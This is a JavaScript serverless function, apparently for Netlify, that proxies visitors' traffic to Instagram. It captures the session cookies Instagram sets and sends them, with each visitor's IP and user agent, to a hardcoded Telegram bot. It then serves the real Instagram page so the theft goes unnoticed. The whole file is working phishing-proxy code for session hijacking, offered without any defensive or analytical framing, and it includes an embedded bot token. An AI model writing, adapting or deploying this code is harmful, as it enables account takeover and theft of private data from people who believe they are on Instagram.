const fetch = require('node-fetch');

// Telegram Config
const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
const TELEGRAM_CHAT_ID = "8569746095";

exports.handler = async (event, context) => {
    try {
        // 1. Get the URL to proxy to from the query string
        // If no URL is provided, default to Instagram
        const urlParam = event.queryStringParameters.url;
        let targetUrl = urlParam || "https://www.instagram.com/";

        // 2. Prepare headers to forward
        const headers = {};
        for (const [key, value] of Object.entries(event.headers)) {
            headers[key] = value;
        }
        
        // Ensure host is correct for the target
        headers['host'] = new URL(targetUrl).host;

        // 3. Fetch from Instagram
        let response;
        try {
            response = await fetch(targetUrl, {
                method: event.httpMethod,
                headers: headers,
                body: event.body ? Buffer.from(event.body, 'base64') : undefined
            });
        } catch (fetchError) {
            return {
                statusCode: 502,
                body: `Bad Gateway: Failed to connect to Instagram. ${fetchError.message}`
            };
        }

        // 4. Capture Cookies from Instagram's response
        const setCookieHeader = response.headers.get('set-cookie');
        const cookies = setCookieHeader || "No cookies found";

        // 5. Prepare Telegram Message
        const timestamp = new Date().toISOString();
        const userAgent = event.headers['user-agent'] || "Unknown UA";
        const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || "Unknown IP";
        
        const message = `
🍪 <b>Instagram Proxy Logged!</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${ip}
📱 <b>User Agent:</b> <code>${userAgent}</code>

🔗 <b>Target URL:</b> <code>${targetUrl}</code>

🍪 <b>Cookies (Set-Cookie):</b>
<code>${cookies}</code>
        `;

        // 6. Send to Telegram
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: "HTML"
                })
            });
        } catch (telegramError) {
            console.error("Telegram Error:", telegramError);
        }

        // 7. Return the response from Instagram to the user
        // We need to manually construct the response because 'fetch' from node-fetch 
        // doesn't directly map to Netlify's response format easily.
        
        // Convert headers to Netlify format
        const responseHeaders = {};
        response.headers.forEach((value, key) => {
            responseHeaders[key] = value;
        });

        // Read the body
        const bodyBuffer = await response.buffer();

        return {
            statusCode: response.status,
            headers: responseHeaders,
            body: bodyBuffer.toString('base64'),
            isBase64Encoded: true
        };

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: error.message })
        };
    }
};
